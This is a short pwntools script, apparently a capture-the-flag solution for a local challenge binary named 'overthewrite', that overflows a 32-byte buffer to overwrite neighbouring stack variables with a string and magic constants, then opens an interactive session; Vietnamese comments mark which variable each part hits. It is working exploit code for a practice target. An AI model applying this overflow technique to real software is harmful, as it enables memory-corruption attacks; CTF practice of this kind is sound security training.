# -*- coding: utf-8 -*-
from pwn import *

p = process("./overthewrite")
payload =b"b" * 32 
payload +=b"Welcome to KCSC\0"+b"\0"*8+p64(0x215241104735F10F)+p64(0xDEADBEEFCAFEBABE)+b"\0"*4  + p32(0x13371337)
#bien v8 payload +=p64(0xDEADBEEFCAFEBABE)
#bien v7 payload += p64(0x215241104735F10F)
#char payload+= b"Welcome to KCSC\0"+b"\0"*8

p.sendafter(b": ", payload)

p.interactive()
